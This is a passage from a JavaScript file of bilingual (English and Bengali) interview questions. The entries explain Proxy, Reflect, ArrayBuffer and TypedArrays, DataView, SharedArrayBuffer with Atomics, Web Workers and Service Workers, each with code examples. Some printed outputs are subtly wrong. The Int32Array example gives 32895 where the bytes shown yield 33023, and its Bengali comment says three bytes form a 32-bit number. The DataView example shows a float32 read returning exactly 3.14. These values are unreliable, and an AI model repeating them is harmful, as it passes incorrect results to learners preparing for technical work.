const proxyUser = new Proxy(user, validatorHandler);

console.log(proxyUser.name); // "Reading property: name" -> "Rohit"
proxyUser.age = 30; // updates age
// proxyUser.age = -5; // Throws TypeError: Age must be a positive number
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **\`Proxy(target, handler)\`**:
  - \`target\`: মূল অবজেক্ট যাকে আপনি প্রক্সি করতে চান।
  - \`handler\`: ইন্টারসেপ্টর বা হুক সমৃদ্ধ একটি অবজেক্ট যাকে "traps" বলা হয়।
- **সাধারণ ট্র্যাপস (Common Traps)**:
  - \`get\`: অবজেক্টের কোনো প্রোপার্টি রিড বা রিট্রাইভ করার সময় ট্রিগার হয়।
  - \`set\`: অবজেক্টে কোনো মান রাইট বা এসাইন করার সময় ট্রিগার হয়। এটি অবশ্যই বুলিয়ান রিটার্ন করবে।
  - \`deleteProperty\`: প্রোপার্টি ডিলিট করতে গেলে ট্রিগার হয়।
  - \`has\`: অবজেক্টের ওপর \`in\` অপারেটর চেক করার সময় ট্রিগার হয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
আধুনিক ফ্রেমওয়ার্কের (যেমন Vue 3 Reactivity) রিঅ্যাক্টিভ স্টেট ট্র্যাকিং। যখন কোনো মেথড স্টেটের মান পরিবর্তন করে, তখন প্রক্সির \`set\` ট্র্যাপ তা ধরে ফেলে এবং স্বয়ংক্রিয়ভাবে স্ক্রিনে ডম রি-রেন্ডার ট্রিগার করে।

### উত্তম অনুশীলন (Best Practice)
স্কিমা ভ্যালিডেশন লেয়ার তৈরি করতে, ডাটা লগিং করতে বা অবজেক্টের অ্যাট্রিবিউট সুরক্ষিত রাখতে প্রক্সি এপিআই ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
\`set\` ট্র্যাপের ভেতর বুলিয়ান \`true\` রিটার্ন করতে ভুলে যাওয়া। এটি না করলে স্ট্রিক্ট মোডে মান অ্যাসাইন করতে গেলে TypeError দেখাবে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const user = { name: "Rohit", age: 25 };

const validatorHandler = {
  get(target, prop) {
    console.log(\`পঠিত প্রোপার্টি: \${prop}\`);
    return target[prop];
  },
  set(target, prop, value) {
    if (prop === "age") {
      if (typeof value !== "number" || value < 0) {
        throw new TypeError("বয়স অবশ্যই পজিটিভ নম্বর হতে হবে");
      }
    }
    target[prop] = value;
    return true; // সঠিকভাবে কাজ সম্পন্ন হয়েছে
  }
};

const proxyUser = new Proxy(user, validatorHandler);

console.log(proxyUser.name); // "পঠিত প্রোপার্টি: name" -> "Rohit"
proxyUser.age = 30; // বয়স আপডেট করবে
// proxyUser.age = -5; // TypeError থ্রো করবে
\`\`\``
  },
  {
    id: 'javascript-78',
    title: 'Explain the Reflect API and its benefits when paired with Proxy.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Reflect API', 'Proxy API', 'Metaprogramming'],
    enAnswer: 'The Reflect API is a global object providing methods for interceptable JavaScript operations, allowing safe forwarding of actions inside Proxy traps.',
    bnAnswer: 'Reflect API হলো জাভাস্ক্রিপ্টের বিল্ট-ইন গ্লোবাল অবজেক্ট যা ইজি ইন্টারসেপ্টেবল মেথড প্রদান করে এবং Proxy ট্র্যাপের ভেতর অ্যাকশনগুলো সেফলি ফরওয়ার্ড করতে সাহায্য করে।',
    enExplanation: `### Explanation
- **Reflect**: Provides 1-to-1 matching static methods for every Proxy trap (e.g. \`Reflect.get()\`, \`Reflect.set()\`, \`Reflect.deleteProperty()\`).
- **Benefits with Proxy**:
  - Handles the default behavior automatically (e.g. returning \`Reflect.get(target, prop, receiver)\` inside a get trap forwards the call cleanly).
  - Handles the \`receiver\` context parameter correctly. If a prototype object is proxied, using \`receiver\` ensures \`this\` inside getters points to the correct subclass instance rather than the proxy target.

### Real-World Example
Writing library code that extends class prototypes. If a subclass inherits a getter from a proxied parent class, using \`Reflect.get(target, prop, receiver)\` preserves the subclass \`this\` binding, avoiding key reference bugs.

### Best Practice
Always use \`Reflect\` methods inside \`Proxy\` traps instead of direct target lookups (like \`target[prop]\`) to preserve proper execution context receiver bindings.

### Common Mistakes
Calling \`Reflect\` as a constructor (\`new Reflect()\`). Reflect is a static namespace object (like \`Math\`), it cannot be instantiated.

### Code Example
\`\`\`javascript
const user = {
  firstName: "Rohit",
  lastName: "Sunny",
  get fullName() {
    return \`\${this.firstName} \${this.lastName}\`;
  }
};

const handler = {
  get(target, prop, receiver) {
    console.log("Intercepted:", prop);
    // Reflect.get preserves 'this' context using receiver
    return Reflect.get(target, prop, receiver);
  }
};

const proxy = new Proxy(user, handler);
console.log(proxy.fullName); // "Intercepted: fullName" -> "Rohit Sunny"
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **Reflect**: এটি প্রতিটি Proxy ট্র্যাপের জন্য ১-টু-১ সমতুল্য স্ট্যাটিক মেথড দেয় (যেমন: \`Reflect.get()\`, \`Reflect.set()\`)।
- **Proxy এর সাথে সুবিধা**:
  - কাস্টম ট্র্যাপ লজিক অ্যাপ্লাই করে বাকি ডিফল্ট কাজগুলো সরাসরি ফরওয়ার্ড করতে সাহায্য করে।
  - এটি রিসিভার (\`receiver\`) প্যারামিটার সেফলি হ্যান্ডেল করে। কোনো প্রোটোটাইপ অবজেক্ট প্রক্সি করা হলে, \`receiver\` ব্যবহার করলে গেটারের ভেতরের \`this\` আসল চাইল্ড অবজেক্টকে পয়েন্ট করে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
লাইব্রেরির ক্লাস ইনহেরিটেন্স নিয়ে কাজ করা। কোনো চাইল্ড ক্লাস যদি প্যারেন্ট প্রক্সি অবজেক্টের গেটার রিড করে, তবে \`Reflect.get(target, prop, receiver)\` চাইল্ডের \`this\` রেফারেন্স সঠিক রাখতে সাহায্য করে।

### উত্তম অনুশীলন (Best Practice)
সরাসরি অবজেক্ট লুকআপের (\`target[prop]\`) পরিবর্তে Proxy ট্র্যাপের ভেতর সবসময় \`Reflect\` মেথড ব্যবহার করুন যাতে রানটাইম কনটেক্সট সঠিক থাকে।

### সাধারণ ভুলসমূহ (Common Mistakes)
\`Reflect\` এর কন্সট্রাক্টর তৈরি করার চেষ্টা করা (\`new Reflect()\`)। Reflect মূলত \`Math\` এর মতোই একটি স্ট্যাটিক নেমস্পেস অবজেক্ট, এর ইনস্ট্যান্স তৈরি করা যায় না।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const user = {
  firstName: "Rohit",
  lastName: "Sunny",
  get fullName() {
    return \`\${this.firstName} \${this.lastName}\`;
  }
};

const handler = {
  get(target, prop, receiver) {
    console.log("ইন্টারসেপ্ট হয়েছে:", prop);
    // Reflect.get রিসিভারের সাহায্যে সঠিক 'this' বজায় রাখে
    return Reflect.get(target, prop, receiver);
  }
};

const proxy = new Proxy(user, handler);
console.log(proxy.fullName); // "ইন্টারসেপ্ট হয়েছে: fullName" -> "Rohit Sunny"
\`\`\``
  },
  {
    id: 'javascript-79',
    title: 'Explain ArrayBuffer and TypedArrays in JavaScript.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'ArrayBuffer', 'TypedArrays', 'Binary Data'],
    enAnswer: 'ArrayBuffer represents a fixed-length raw binary data buffer. TypedArrays (like Uint8Array) provide a typed view over the ArrayBuffer to read/write numeric values.',
    bnAnswer: 'ArrayBuffer একটি নির্দিষ্ট সাইজের কাঁচা বাইনারি ডাটা বাফার রিপ্রেজেন্ট করে। TypedArrays (যেমন Uint8Array) বাইনারি ডেটা রিড/রাইট করার ভিউ দেয়।',
    enExplanation: `### Explanation
- **\`ArrayBuffer\`**: A physical memory allocation block. It holds raw bytes. You cannot read or write to it directly.
- **\`TypedArrays\`**: View objects that parse the buffer bytes as specific numeric formats:
  - \`Uint8Array\`: 8-bit unsigned integers (values 0-255).
  - \`Int32Array\`: 32-bit signed integers.
  - \`Float64Array\`: 64-bit floating point numbers.
- They are critical for processing high-performance binary files, image manipulation, and network sockets.

### Real-World Example
Handling WebGL coordinates or audio processing. Running real-time game rendering requires sending raw float buffers directly to the GPU without string/object serialization overhead.

### Best Practice
Use typed arrays when parsing custom file bytes (like parsing ZIP headers, PNG chunks) or streaming audio packet data via WebSockets.

### Common Mistakes
Modifying a TypedArray index and expecting the array length to grow dynamically. Unlike standard JS arrays, TypedArrays have a **strictly fixed size** defined at allocation.

### Code Example
\`\`\`javascript
// Allocate 8 bytes of physical memory
const buffer = new ArrayBuffer(8);

// Create a view to read/write 8-bit unsigned integers
const view8 = new Uint8Array(buffer);
view8[0] = 255;
view8[1] = 128;

console.log(view8); // Uint8Array(8) [255, 128, 0, 0, 0, 0, 0, 0]

// Create a different view on the same memory buffer
const view32 = new Int32Array(buffer);
// The same bytes are now interpreted as 32-bit integers
console.log(view32[0]); // 32895 (combined byte representation!)
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **\`ArrayBuffer\`**: এটি ব্রাউজারের ফিজিক্যাল মেমরি বরাদ্দের একটি ব্লক যা কাঁচা বাইট (bytes) ধারণ করে। এতে সরাসরি রিড/রাইট করা যায় না।
- **\`TypedArrays\`**: এগুলো মূলত বাফারের বাইটগুলোকে নির্দিষ্ট নম্বর টাইপ হিসেবে রিড করার ভিউ অবজেক্ট:
  - \`Uint8Array\`: ৮-বিট আনসাইন্ড ইন্টিজার (মান ০-২৫৫)।
  - \`Int32Array\`: ৩২-বিট সাইন্ড ইন্টিজার।
  - \`Float64Array\`: ৬৪-বিট ফ্লোটিং পয়েন্ট দশমিক নম্বর।
- এগুলো ওয়েব সকেট স্ট্রিম, ইমেজ প্রসেসিং ও WebGL এ অত্যন্ত দ্রুত পারফরম্যান্স নিশ্চিত করে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
WebGL গ্রাফিক্স গেম তৈরি করা। গেমের ত্রিমাত্রিক স্থানাঙ্ক বা কোঅর্ডিনেট ডাটাগুলো সাধারণ অবজেক্ট বা জেসন আকারে না পাঠিয়ে বাইনারি ফ্লোট বাফার হিসেবে সরাসরি জিপিউতে (GPU) পাঠানো, যা রেন্ডার স্পিড বাড়ায়।

### উত্তম অনুশীলন (Best Practice)
বাইনারি ফাইল ফরম্যাট পার্স করার সময় (যেমন: ZIP ডিকম্প্রেশন বা PNG পিক্সেল রিড) মেমরি সেভ করতে টাইপড অ্যারে ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
টাইপড অ্যারে ব্যবহারের পর মেমরি বা ডাইনামিক লেন্থ আশা করা। সাধারণ অ্যারের মতো এতে নতুন নোড পুশ (\`push\`) করা যায় না, এর সাইজ বরাদ্দের সময়ই ফিক্সড হয়ে যায়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ৮ বাইটের মেমরি বাফার বরাদ্দ করা হলো
const buffer = new ArrayBuffer(8);

// ৮-বিট ইন্টিজার ভিউ অবজেক্ট তৈরি
const view8 = new Uint8Array(buffer);
view8[0] = 255;
view8[1] = 128;

console.log(view8); // Uint8Array(8) [255, 128, 0, 0, 0, 0, 0, 0]

// একই মেমরির ওপর ৩২-বিট ইন্টিজার ভিউ তৈরি
const view32 = new Int32Array(buffer);
// ৩ টি ৮-বিট ব্লক মিলে ১ টি ৩২-বিট সংখ্যা রিপ্রেজেন্ট করবে
console.log(view32[0]); // 32895
\`\`\``
  },
  {
    id: 'javascript-80',
    title: 'Explain the DataView object and its difference from TypedArrays.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'DataView', 'ArrayBuffer', 'Binary Data'],
    enAnswer: 'DataView provides a low-level interface to read/write arbitrary numeric types in an ArrayBuffer, allowing custom byte alignment and explicit Big/Little Endian configuration.',
    bnAnswer: 'DataView বাফারের ওপর যেকোনো ধরনের সংখ্যা রিড/রাইট করার এপিআই দেয় এবং Big/Little Endian (বাইট ক্রমানুসারে) কনফিগার করার সুবিধা দেয়।',
    enExplanation: `### Explanation
- **TypedArrays**: Are locked to a single numeric type and utilize the client platform's default byte order (Endianness).
- **\`DataView\`**:
  - Allows mixed-type parsing of the same buffer. You can read a 16-bit integer at byte offset 0, and a 32-bit float at byte offset 2.
  - Exposes an explicit little-endian parameter (e.g. \`view.getInt16(offset, true)\`). This is critical when parsing binary files compiled on different CPU architectures.

### Real-World Example
Parsing custom file headers (like MP3 files, or binary network packets from a C++ backend). The packet might contain a 1-byte status flag, followed by a 4-byte little-endian message length, followed by utf-8 bytes. Only \`DataView\` can parse this mixed alignment.

### Best Practice
Always use \`DataView\` when parsing binary protocols received over the network to guarantee endianness matches the protocol spec rather than the user's browser CPU.

### Common Mistakes
Writing outside the buffer bounds in DataView. Doing so throws a \`RangeError\`, as it does not auto-resize the underlying buffer.

### Code Example
\`\`\`javascript
const buffer = new ArrayBuffer(6);
const view = new DataView(buffer);

// Write mixed data types into the same buffer
view.setUint8(0, 42); // 1 byte integer at offset 0
view.setFloat32(1, 3.14, true); // 4 byte float at offset 1 (Little Endian)

// Read values back
console.log(view.getUint8(0)); // 42
console.log(view.getFloat32(1, true)); // 3.14
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **TypedArrays**: একটি নির্দিষ্ট টাইপের মধ্যেই মেমরি লক করে রাখে এবং ডিভাইসের ডিফল্ট বাইট ক্রমানুসারে (Endianness) চলে।
- **\`DataView\`**:
  - এটি একই বাফার থেকে মিক্সড বা একাধিক টাইপের ডাটা রিড করতে পারে। যেমন: অফসেট ০ এ ১৬-বিট সংখ্যা এবং অফসেট ২ এ ৩২-বিট দশমিক সংখ্যা রিড করা।
  - এটি স্পষ্টভাবে লিটল-এন্ডিয়ান (Little Endian) প্যারামিটার সাপোর্ট করে (যেমন: \`view.getInt16(offset, true)\`)। এটি ভিন্ন সিপিইউ আর্কিটেকচার থেকে আসা বাইনারি ফাইল ডিকোড করতে আবশ্যক।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
একটি C++ ব্যাকএন্ড সার্ভার থেকে আসা কাস্টম বাইনারি প্যাকেট পার্স করা। প্যাকেটের প্রথমে ১ বাইটের স্ট্যাটাস ফ্ল্যাগ, তারপর ৪ বাইটের লিটল-এন্ডিয়ান মেসেজ লেন্থ এবং সবশেষে মেসেজ ক্যারেক্টার থাকে। এই জটিল বিন্যাস কেবল \`DataView\` দিয়েই ডিকোড করা সম্ভব।

### উত্তম অনুশীলন (Best Practice)
নেটওয়ার্কের মাধ্যমে বাইনারি প্রোটোকল রিড করার সময় সবসময় \`DataView\` ব্যবহার করুন এবং এন্ডিয়াননেস ফিক্সড করে দিন, যাতে ইউজারের ডিভাইসের সিপিইউ এর কারণে ডাটা বদলে না যায়।

### সাধারণ ভুলসমূহ (Common Mistakes)
বাফার সাইজের বেশি ডাটা রাইট করার চেষ্টা করা। এটি বাফার অটো-রিসাইজ না করে সরাসরি \`RangeError\` থ্রো করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const buffer = new ArrayBuffer(6);
const view = new DataView(buffer);

// একই মেমরিতে মিক্সড ডাটা টাইপ রাইট করা
view.setUint8(0, 42); // অফসেট ০ এ ১ বাইটের ইন্টিজার
view.setFloat32(1, 3.14, true); // অফসেট ১ এ ৪ বাইটের ফ্লোট (Little Endian)

// ভ্যালু রিড করা
console.log(view.getUint8(0)); // 42
console.log(view.getFloat32(1, true)); // 3.14
\`\`\``
  },
  {
    id: 'javascript-81',
    title: 'Explain SharedArrayBuffer and Atomics in JavaScript.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'SharedArrayBuffer', 'Atomics', 'Multithreading'],
    enAnswer: 'SharedArrayBuffer represents shared memory space between web workers. Atomics provides static methods to read/write this memory safely without race conditions.',
    bnAnswer: 'SharedArrayBuffer ওয়েব ওয়ার্কারদের মধ্যে শেয়ার্ড মেমরি স্পেস তৈরি করে। Atomics এই মেমরিতে রেস কন্ডিশন ছাড়া নিরাপদে রিড/রাইট করার মেথড দেয়।',
    enExplanation: `### Explanation
JavaScript is single-threaded, but Web Workers allow running parallel background threads.
- **\`SharedArrayBuffer\`**: Memory buffer that is shared *directly* between the main thread and workers. Instead of copying data via slow message-passing (\`postMessage\`), both threads read/write the same physical memory.
- **\`Atomics\`**: Since multiple threads write to the same memory, race conditions occur. The \`Atomics\` object provides atomic operations (like \`Atomics.add()\`, \`Atomics.load()\`, \`Atomics.wait()\`) ensuring memory operations complete fully before other threads access them.

### Real-World Example
High-performance rendering or physics engines in web browser games. The physics calculations run in background workers, directly modifying coordinate arrays stored in a SharedArrayBuffer to let the main thread render them instantly.

### Best Practice
Always protect thread writes using Atomics locks to prevent corrupt data states during concurrent executions.

### Common Mistakes
Assuming SharedArrayBuffer is enabled everywhere. Due to Spectre/Meltdown hardware security leaks, it requires specific HTTP headers (Cross-Origin-Opener-Policy and Cross-Origin-Embedder-Policy) to be active.

### Code Example
\`\`\`javascript
// Allocate shared memory for 1 integer
const sab = new SharedArrayBuffer(4);
const int32 = new Int32Array(sab);

// In main thread:
Atomics.store(int32, 0, 100);

// In worker thread (receives sab via postMessage):
// Read value atomically (guarantees safe fetch)
const val = Atomics.load(int32, 0);
console.log("Worker read:", val); // 100

// Add 50 atomically
Atomics.add(int32, 0, 50);
console.log("New Value:", Atomics.load(int32, 0)); // 150
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
জাভাস্ক্রিপ্ট মেইন থ্রেড সিঙ্গেল হলেও ওয়েব ওয়ার্কার দিয়ে মাল্টি-থ্রেডিং করা যায়:
- **\`SharedArrayBuffer\`**: এমন একটি বিশেষ মেমরি বাফার যা মেইন থ্রেড ও ব্যাকগ্রাউন্ড ওয়ার্কারদের মধ্যে সরাসরি শেয়ার্ড থাকে। \`postMessage\` দিয়ে মেসেজ পাসের ধীরগতির প্রক্রিয়া ছাড়া উভয় থ্রেড একই মেমরি রিড করতে পারে।
- **\`Atomics\`**: একাধিক থ্রেড একই মেমরিতে ডাটা রাইট করতে গেলে "রেস কন্ডিশন" (ডাটা করাপ্ট হওয়া) এড়াতে এটি ব্যবহৃত হয়। এটি মেমরিতে অ্যাটমিক অপারেশন নিশ্চিত করে (যেমন: \`Atomics.add()\`, \`Atomics.wait()\`) যাতে অন্য থ্রেড কাজ শুরুর আগে রাইট সম্পূর্ণ হয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
ব্রাউজার গেমের ফিজিক্স ও ৩ডি রেন্ডারিং ইঞ্জিন। ফিজিক্সের ভারী ক্যালকুলেশন ব্যাকগ্রাউন্ড ওয়ার্কার নোডে চলে এবং ডিরেক্ট \`SharedArrayBuffer\`-এ রাখা স্থানাঙ্ক মডিফাই করে, যা মেইন থ্রেড সাথে সাথে রেন্ডার করতে পারে।

### উত্তম অনুশীলন (Best Practice)
শেয়ার্ড মেমরি ব্যবহারের সময় কোনো ডাটা ওভাররাইট হওয়া এড়াতে এবং সিকিউরিটি ঠিক রাখতে সবসময় \`Atomics\` লকিং ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
ধরে নেওয়া যে এটি সব ব্রাউজারে এমনিতেই কাজ করবে। সিপিইউ-র হার্ডওয়্যার সিকিউরিটি লিক (Spectre) এড়াতে, এটি চালাতে সার্ভারে অবশ্যই Cross-Origin-Opener-Policy এবং Cross-Origin-Embedder-Policy হেডার সেট করতে হয়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ১টি ইন্টিজারের জন্য শেয়ার্ড মেমরি বাফার তৈরি
const sab = new SharedArrayBuffer(4);
const int32 = new Int32Array(sab);

// মেইন থ্রেড থেকে ডাটা স্টোর করা হচ্ছে:
Atomics.store(int32, 0, 100);

// ওয়ার্কার থ্রেডের কোড (যা postMessage দিয়ে sab এর লিঙ্ক পেয়েছে):
// অ্যাটমিকালি ডাটা রিড করা হচ্ছে (নিরাপত্তা গ্যারান্টিড)
const val = Atomics.load(int32, 0);
console.log("ওয়ার্কার রিড করেছে:", val); // 100

// অ্যাটমিকালি ৫০ যোগ করা হচ্ছে
Atomics.add(int32, 0, 50);
console.log("নতুন মান:", Atomics.load(int32, 0)); // 150
\`\`\``
  },
  {
    id: 'javascript-82',
    title: 'Explain Web Workers and multi-threading in JavaScript.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Web Workers', 'Multithreading', 'Asynchronous'],
    enAnswer: 'Web Workers run scripts in background threads parallel to the main window thread, communicating via asynchronous message passing (postMessage API).',
    bnAnswer: 'Web Workers মেইন উইন্ডো থ্রেডের সমান্তরালে ব্যাকগ্রাউন্ড থ্রেডে স্ক্রিপ্ট রান করায় এবং postMessage এপিআই দিয়ে মেসেজ আদান-প্রদান করে।',
    enExplanation: `### Explanation
- **Main Thread**: Handles DOM manipulation, layout, paint, and user interactions.
- **Web Workers**: Independent background execution threads.
  - **Limitations**: No access to the DOM, \`window\`, or \`document\` objects (to prevent concurrency clashes). They can use timers, fetch requests, and WebSockets.
  - **Communication**: Done via serialized messaging. The \`postMessage()\` api sends data, triggering the \`onmessage\` event listener in the receiving thread.

### Real-World Example
Processing CSV reports in dashboard systems. Parsing a 100MB CSV file synchronously will freeze the React UI. Handing the parsing task to a Web Worker keeps the UI completely smooth and responsive during the 5-second calculation.

### Best Practice
Utilize Web Workers for heavy computations, large data parsing, image processing, or cryptography modules to prevent main thread blocking.

### Common Mistakes
Trying to directly access UI elements or cookies inside Web Workers. They will throw a ReferenceError because the \`window\` context does not exist in the worker scope.

### Code Example
\`\`\`javascript
// main.js
const worker = new Worker("worker.js");

// Send data to worker
worker.postMessage({ number: 10 });

// Listen for response
worker.onmessage = (event) => {
  console.log("Result from worker:", event.data.result);
};

// worker.js (Background thread script)
self.onmessage = (event) => {
  const { number } = event.data;
  // Heavy computation
  const result = number * 2; 
  
  // Send back result
  self.postMessage({ result });
};
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **মেইন থ্রেড**: পেজের DOM এডিটিং, লেআউট, পেইন্ট ও ইউজারের ক্লিকে রেসপন্স করার কাজ করে।
- **ওয়েব ওয়ার্কার (Web Workers)**: এটি সম্পূর্ণ স্বাধীন ব্যাকগ্রাউন্ড স্ক্রিপ্টিং থ্রেড।
  - **সীমাবদ্ধতা**: কনকারেন্সি কনফ্লিক্ট এড়াতে ওয়ার্কারের ভেতর থেকে সরাসরি DOM, \`window\` বা \`document\` অবজেক্ট অ্যাক্সেস করা যায় না। তবে তারা ফেচ, টাইমার বা ক্রিপ্টো মেথড চালাতে পারে।
  - **যোগাযোগ**: \`postMessage()\` মেথড দিয়ে ডাটা সেন্ড করা হয় এবং অন্য পাশে \`onmessage\` ইভেন্ট লিসেনার দিয়ে ডাটা ক্যাচ করতে হয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
১০০ মেগাবাইটের এক্সেল বা CSV ফাইল ড্যাশবোর্ডে পার্স করা। মেইন থ্রেডে এটি করলে ব্রাউজার ৫ সেকেন্ডের জন্য লক হয়ে যাবে। পার্সিংয়ের কাজ ব্যাকগ্রাউন্ড ওয়েব ওয়ার্কারকে দিলে ব্যবহারকারী কোনো ল্যাগ ছাড়াই সাইট স্ক্রল করতে পারেন।

### উত্তম অনুশীলন (Best Practice)
জটিল হিসাবনিকাশ, ইমেজ রিসাইজিং, পিডিএফ জেনারেশন বা পাসওয়ার্ড হ্যাশিং এর মতো ভারী স্ক্রিপ্টগুলো মেইন থ্রেড থেকে সরিয়ে ওয়েব ওয়ার্কারে ট্রান্সফার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
ওয়েব ওয়ার্কারের বডিতে সরাসরি ডম আপডেট করতে চাওয়া। সেখানে \`window\` অবজেক্ট না থাকায় রেফারেন্স এরর দিয়ে স্ক্রিপ্ট ক্র্যাশ করবে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// main.js (মেইন থ্রেড)
const worker = new Worker("worker.js");

// ওয়ার্কারে ডাটা পাঠানো
worker.postMessage({ number: 10 });

// রেসপন্স রিসিভ করা
worker.onmessage = (event) => {
  console.log("ওয়ার্কার থেকে পাওয়া রেজাল্ট:", event.data.result);
};

// worker.js (ব্যাকগ্রাউন্ড থ্রেড স্ক্রিপ্ট)
self.onmessage = (event) => {
  const { number } = event.data;
  // ব্যাকগ্রাউন্ডের ক্যালকুলেশন
  const result = number * 2; 
  
  // মেইন থ্রেডে ফেরত পাঠানো
  self.postMessage({ result });
};
\`\`\``
  },
  {
    id: 'javascript-83',
    title: 'Explain Service Workers and their lifecycle.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Service Workers', 'PWA', 'Caching'],
    enAnswer: 'Service Workers act as proxy servers between the browser and network, enabling offline capabilities and caching. Their lifecycle consists of: Registration, Installation, and Activation.',
    bnAnswer: 'Service Workers ব্রাউজার ও নেটওয়ার্কের মাঝে প্রক্সি সার্ভার হিসেবে কাজ করে অফলাইন ক্যাশিং সুবিধা দেয়। এর লাইফসাইকেল হলো: Registration, Installation, এবং Activation।',
    enExplanation: `### Explanation
Service Workers are a core technology powering Progressive Web Apps (PWAs):
- **Behavior**: Run in a separate thread. They can intercept network requests (using \`fetch\` listener) and serve cached assets from the Cache Storage API when offline.
- **Lifecycle**:
  1. **Registration**: The browser registers the worker path in client JS.
  2. **Installation (\`install\` event)**: Triggers only once when the worker is first loaded or updated. Used to pre-cache static assets.
  3. **Activation (\`activate\` event)**: Runs once the old service worker is completely terminated. Used to clear old caches.

### Real-World Example
Off-line support for docs or email clients. When user loses internet connection, the service worker intercepts the outgoing page load request and returns cached HTML files, displaying an offline-mode dashboard instead of a chrome offline dinosaur screen.

### Best Practice
Always version cache names (e.g. \`v1\`, \`v2\`) to clear outdated cached resources safely during the \`activate\` lifecycle phase.

### Common Mistakes
Forgetting that Service Workers require HTTPS connections (except localhost) due to the immense power they hold to intercept and manipulate network requests.

### Code Example
\`\`\`javascript
// In main.js (Register worker)
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js")
    .then(() => console.log("Service Worker Registered!"));
}

// sw.js (Service Worker script)
const CACHE_NAME = "v1_cache";

// 1. Install Event (Caching static assets)
self.addEventListener("install", (e) => {
  e.waitUntil(
    caches.open(CACHE_NAME).then((cache) => {
      return cache.addAll(["/", "/index.html", "/styles.css"]);
    })
  );
});

// 2. Fetch Event (Proxying network request)
self.addEventListener("fetch", (e) => {
  e.respondWith(
    caches.match(e.request).then((response) => {
      // Return cached version or fetch from internet
      return response || fetch(e.request);
    })
  );
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
Service Workers হলো প্রগ্রেসিভ ওয়েব অ্যাপস (PWA) তৈরির মূল টেকনোলজি:
- **আচরণ**: আলাদা থ্রেডে চলে। এটি ব্রাউজার থেকে পাঠানো এপিআই ও ফাইল রিকোয়েস্ট ইন্টারসেপ্ট করতে পারে এবং ইন্টারনেট না থাকলে ব্রাউজারের কাস্টম ক্যাশ স্টোরেজ থেকে ডাটা রিটার্ন করতে পারে।
- **লাইফসাইকেল**:
  ১. **রেজিস্ট্রেশন**: ক্লায়েন্ট সাইড জাভাস্ক্রিপ্ট দিয়ে ব্রাউজারে ওয়ার্কার পাথ রেজিস্টার করানো হয়।
  ২. **ইনস্টলেশন (\`install\` ইভেন্ট)**: প্রথমবার লোড বা আপডেট হলে একবার চলে। এটি মূলত স্ট্যাটিক ফাইলগুলো ক্যাশে জমা করতে ব্যবহৃত হয়।
  ৩. **অ্যাক্টিভেশন (\`activate\` ইভেন্ট)**: পুরোনো ওয়ার্কারটি সম্পূর্ণ টার্মিনেট হলে নতুনটি সচল হয়। এটি পুরোনো মেমরি ক্যাশ ডিলিট করার জন্য উপযুক্ত সময়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
অফলাইন ডাটা অ্যাক্সেস। ইন্টারনেট কানেকশন চলে গেলে নোটিফিকেশন বা ইমেইল অ্যাপ অফলাইনেও রেন্ডার করা, যাতে ব্রাউজার ক্র্যাশ না দেখিয়ে পূর্বের ইমেইল ডাটাগুলো ক্যাশ থেকে পড়তে দেয়।

### উত্তম অনুশীলন (Best Practice)
ইউজারের ব্রাউজারে পুরোনো ফাইল জমে থাকা এড়াতে অ্যাক্টিভেট ইভেন্টের সময় ক্যাশ নামের সাথে ভার্সন ডিক্লেয়ার করে (\`v1\`, \`v2\`) আগের ক্যাশ ডিলিট করে দিন।

### সাধারণ ভুলসমূহ (Common Mistakes)
নিরাপত্তার বিষয়টি ভুলে যাওয়া। যেহেতু এটি নেটওয়ার্ক রিকোয়েস্ট পরিবর্তন করতে পারে, তাই সুরক্ষার স্বার্থে লোকালহোস্ট ছাড়া প্রোডাকশনে এটি চালাতে অবশ্যই HTTPS কানেকশন থাকতে হবে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// main.js (রেজিস্ট্রেশন)
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js")
    .then(() => console.log("সার্ভিস ওয়ার্কার রেজিস্টার হয়েছে!"));
}

// sw.js (সার্ভিস ওয়ার্কার কোড)
const CACHE_NAME = "v1_cache";

// ১. ইনস্টল ইভেন্ট (স্ট্যাটিক রিসোর্স ক্যাশ করা)
self.addEventListener("install", (e) => {
  e.waitUntil(
    caches.open(CACHE_NAME).then((cache) => {
      return cache.addAll(["/", "/index.html", "/styles.css"]);
    })
  );
});

// ২. ফেচ ইভেন্ট (রিকোয়েস্ট ইন্টারসেপ্ট ও অফলাইন ক্যাশ ডেলিভারি)
self.addEventListener("fetch", (e) => {
  e.respondWith(
    caches.match(e.request).then((response) => {
      // ক্যাশ ফাইল থাকলে তা দিবে, না থাকলে নেটওয়ার্ক থেকে আনবে
      return response || fetch(e.request);
    })
  );
});
